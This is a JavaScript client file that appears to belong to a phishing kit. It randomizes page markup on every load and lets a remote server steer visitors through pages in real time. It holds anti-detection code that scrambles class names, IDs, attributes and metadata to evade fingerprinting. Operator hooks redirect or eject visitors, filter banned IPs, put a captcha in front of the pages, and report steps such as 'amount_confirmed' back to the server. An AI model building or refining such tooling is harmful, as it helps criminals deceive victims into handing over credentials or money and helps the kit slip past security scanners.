// HTMLTransformer integrated directly into socket client
const HTMLTransformer = {
    transformationStrategies: {
        // Randomize class names while preserving styling
        classes: (html) => {
            const classMap = new Map();
            let classCounter = 0;
            
            return html.replace(/class="([^"]+)"/g, (match, classes) => {
                const newClasses = classes.split(' ').map(cls => {
                    if (!classMap.has(cls)) {
                        classMap.set(cls, `c${Math.random().toString(36).substr(2, 6)}_${classCounter++}`);
                    }
                    return classMap.get(cls);
                }).join(' ');
                return `class="${newClasses}"`;
            });
        },

        // Randomize element IDs
        ids: (html) => {
            const idMap = new Map();
            let idCounter = 0;
            
            return html.replace(/id="([^"]+)"/g, (match, id) => {
                if (!idMap.has(id)) {
                    idMap.set(id, `i${Math.random().toString(36).substr(2, 6)}_${idCounter++}`);
                }
                return `id="${idMap.get(id)}"`;
            });
        },

        // Randomize attribute order
        attributes: (html) => {
            return html.replace(/<([a-zA-Z0-9]+)([^>]+)>/g, (match, tag, attrs) => {
                const attributes = attrs.trim().split(/\s+(?=[a-zA-Z-]+=)/).filter(Boolean);
                const shuffled = attributes.sort(() => Math.random() - 0.5);
                return `<${tag} ${shuffled.join(' ')}>`;
            });
        },

        // Add random whitespace and line breaks
        whitespace: (html) => {
            return html.replace(/>\s+</g, (match) => {
                const spaces = ' '.repeat(Math.floor(Math.random() * 4) + 1);
                const linebreaks = '\n'.repeat(Math.floor(Math.random() * 2) + 1);
                return `>${spaces}${linebreaks}<`;
            });
        },

        // Randomize comment content
        comments: (html) => {
            return html.replace(/<!--[\s\S]*?-->/g, () => {
                return `<!-- ${Math.random().toString(36).substring(7)} -->`;
            });
        },

        // Add random data attributes
        dataAttributes: (html) => {
            return html.replace(/<([a-zA-Z0-9]+)([^>]*)>/g, (match, tag, attrs) => {
                if (Math.random() > 0.7) {
                    const randomData = `data-v${Math.random().toString(36).substring(7)}="${Math.random().toString(36).substring(7)}"`;
                    return `<${tag}${attrs} ${randomData}>`;
                }
                return match;
            });
        },

        // Randomize style order within style tags
        styles: (html) => {
            return html.replace(/<style[^>]*>([\s\S]*?)<\/style>/g, (match, styles) => {
                const rules = styles.split('}').filter(Boolean);
                const shuffled = rules.sort(() => Math.random() - 0.5);
                return `<style>${shuffled.join('}\n')}}}</style>`;
            });
        }
    },

    async transformHTML(html) {
        // Apply all transformation strategies in random order
        const strategies = Object.values(this.transformationStrategies);
        const shuffledStrategies = strategies.sort(() => Math.random() - 0.5);

        let transformedHtml = html;
        for (const strategy of shuffledStrategies) {
            transformedHtml = strategy(transformedHtml);
        }

        // Add dynamic nonce for script tags
        const nonce = Math.random().toString(36).substring(7);
        transformedHtml = transformedHtml.replace(/<script/g, `<script nonce="${nonce}"`);

        // Add random metadata
        const metaTags = [
            `<meta name="v${Math.random().toString(36).substring(7)}" content="${Math.random().toString(36).substring(7)}">`,
            `<meta name="t${Math.random().toString(36).substring(7)}" content="${Date.now()}">`
        ];
        transformedHtml = transformedHtml.replace('</head>', `${metaTags.join('\n')}\n</head>`);

        return transformedHtml;
    }
};

class URLManager {
    static currentUrl = null;
    static sessionId = null;
    static currentPage = 'awaiting';

    static getCurrentPage() {
        const path = window.location.pathname;
        const page = path.split('/').pop().replace('.html', '');
        return page || 'awaiting';
    }

    static updateURL(url) {
        if (!url) return;

        const urlParams = new URLSearchParams(url.split('?')[1]);
        const clientId = urlParams.get('client_id');
        const oauthChallenge = urlParams.get('oauth_challenge');
        
        const currentParams = new URLSearchParams(window.location.search);
        const verified = currentParams.get('verified');
        
        let newUrl = url;
        if (verified === '1') {
            newUrl += '&verified=1';
        }

        window.history.replaceState({}, '', newUrl);
        this.currentUrl = newUrl;
        
        if (clientId) {
            this.sessionId = clientId;
        }
    }

    static getSessionId() {
        if (this.sessionId) return this.sessionId;
        return new URLSearchParams(window.location.search).get('client_id');
    }
}

// Initialize session state
let isForceDisconnected = false;
let reconnectDisabled = false;

// Initialize socket with modified options
const socket = io('/user', {
    query: { page: window.location.pathname.split('/').pop() },
    reconnection: true,
    reconnectionAttempts: 5,
    reconnectionDelay: 1000,
    forceNew: true
});

// Enhanced page change handler with dynamic transformation
async function emitPageChange(pageName) {
    socket.emit('page_loading', true);
    
    try {
        // Fetch and transform the HTML
        const response = await fetch(`/pages/${pageName}.html`);
        let html = await response.text();
        html = await HTMLTransformer.transformHTML(html);
        
        // Update the page content
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        // Store current scripts
        const currentScripts = [...document.scripts].map(script => script.src);
        
        // Update document content
        document.body.innerHTML = doc.body.innerHTML;
        
        // Re-execute scripts
        const newScripts = [...doc.scripts].filter(script => !currentScripts.includes(script.src));
        for (const script of newScripts) {
            const newScript = document.createElement('script');
            if (script.src) {
                newScript.src = script.src;
            } else {
                newScript.textContent = script.textContent;
            }
            document.body.appendChild(newScript);
        }
        
        // Update state
        socket.emit('page_change', pageName + '.html');
        URLManager.currentPage = pageName;
        
    } catch (error) {
        console.error('Page transformation error:', error);
        window.location.href = `/pages/${pageName}.html`;
    } finally {
        socket.emit('page_loading', false);
    }
}

// Socket event handlers
socket.on('force_disconnect', () => {
    console.log('Forced disconnect received');
    isForceDisconnected = true;
    reconnectDisabled = true;
    socket.io.opts.reconnection = false;
    socket.disconnect();
    
    if (window.heartbeatInterval) clearInterval(window.heartbeatInterval);
    
    setTimeout(() => {
        window.location.href = 'https://google.com';
    }, 100);
});

socket.on('connect', () => {
    if (isForceDisconnected) {
        socket.disconnect();
        return;
    }

    console.log('Socket connected');
    socket.emit('page_loading', true);
    
    const sessionId = URLManager.getSessionId();
    if (sessionId) {
        socket.emit('check_session', {
            sessionId,
            currentUrl: window.location.pathname + window.location.search
        });
    }
    
    const currentPage = URLManager.getCurrentPage();
    emitPageChange(currentPage);

    setTimeout(() => socket.emit('page_loading', false), 500);
});

socket.on('session_url', (url) => {
    console.log('Received session URL:', url);
    URLManager.updateURL(url);
});

socket.on('redirect', (url) => {
    if (isForceDisconnected) return;
    
    console.log('Redirecting to:', url);
    socket.emit('page_loading', true);
    
    const pageMatch = url.match(/([^\/]+?)\.html$/i);
    const pageName = pageMatch ? pageMatch[1] : 'awaiting';
    URLManager.currentPage = pageName;

    const onUnload = () => {
        window.removeEventListener('beforeunload', onUnload);
    };
    window.addEventListener('beforeunload', onUnload);

    setTimeout(() => {
        window.location.href = url;
    }, 50);
});

socket.on('connect_error', (error) => {
    if (reconnectDisabled) return;
    
    console.error('Connection error:', error);
    if (error.message === 'IP banned' || error.message === 'website disabled') {
        window.location.href = '/pages/loading.html';
    }
});

// Heartbeat setup
window.heartbeatInterval = setInterval(() => {
    if (!isForceDisconnected && socket.connected) {
        socket.emit('heartbeat');
    }
}, 3000);

// Event listeners
window.addEventListener('popstate', () => {
    if (!isForceDisconnected) {
        const currentPage = URLManager.getCurrentPage();
        emitPageChange(currentPage);
    }
});

document.addEventListener('click', (e) => {
    if (!isForceDisconnected && e.target.tagName === 'A' && e.target.href) {
        const url = new URL(e.target.href);
        if (url.origin === window.location.origin) {
            e.preventDefault();
            const pageMatch = url.pathname.match(/([^\/]+?)\.html$/i);
            const pageName = pageMatch ? pageMatch[1] : 'awaiting';
            emitPageChange(pageName);
        }
    }
});

window.addEventListener('load', () => {
    if (!isForceDisconnected) {
        console.log('Page fully loaded');
        socket.emit('page_loading', false);
    }
});

document.addEventListener('DOMContentLoaded', () => {
    if (!isForceDisconnected) {
        const currentPage = URLManager.getCurrentPage();
        emitPageChange(currentPage);
        setTimeout(() => socket.emit('page_loading', false), 500);
    }
});

window.addEventListener('beforeunload', () => {
    socket.emit('page_loading', true);
    socket.emit('user_leaving');
});

// Captcha handler
window.onCaptchaSuccess = async (token) => {
    try {
        socket.emit('page_loading', true);
        
        const response = await fetch('/verify-turnstile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                token,
                sessionId: URLManager.getSessionId()
            })
        });

        const result = await response.json();
        if (result.success && result.verified && result.url) {
            // Important: Emit user action before redirect
            socket.emit('captcha_verified');
            
            // Update URL manager and page state
            URLManager.currentPage = 'Loading';
            URLManager.updateURL(result.url);
            
            // Use replace to prevent back navigation
            window.location.replace(result.url);
        } else {
            console.error('Verification failed:', result.error);
            socket.emit('page_loading', false);
        }
    } catch (error) {
        console.error('Captcha verification failed:', error);
        socket.emit('page_loading', false);
    }
};

// User action handlers
window.handleUserAction = async (actionType, data) => {
    socket.emit('user_action', {
        type: actionType,
        data: data,
        timestamp: new Date().toISOString()
    });
};

window.confirmAmount = (amount) => {
    socket.emit('amount_confirmed', { amount });
};

window.completeReview = () => {
    socket.emit('review_completed', {
        timestamp: new Date().toISOString()
    });
};

// Connection state handlers
socket.on('disconnect', () => {
    console.log('Socket disconnected');
    if (isForceDisconnected) {
        socket.io.opts.reconnection = false;
    }
});

socket.on('reconnect', (attemptNumber) => {
    if (isForceDisconnected) {
        socket.disconnect();
        return;
    }
    
    console.log('Socket reconnected after', attemptNumber, 'attempts');
    socket.emit('page_loading', true);
    
    const currentPage = URLManager.getCurrentPage();
    emitPageChange(currentPage);
    
    setTimeout(() => socket.emit('page_loading', false), 500);
});

socket.on('reconnect_attempt', () => {
    if (reconnectDisabled || isForceDisconnected) {
        return false;
    }
    console.log('Attempting to reconnect...');
});

socket.on('reconnecting', (attemptNumber) => {
    if (!isForceDisconnected) {
        console.log('Reconnecting...', attemptNumber);
    }
});
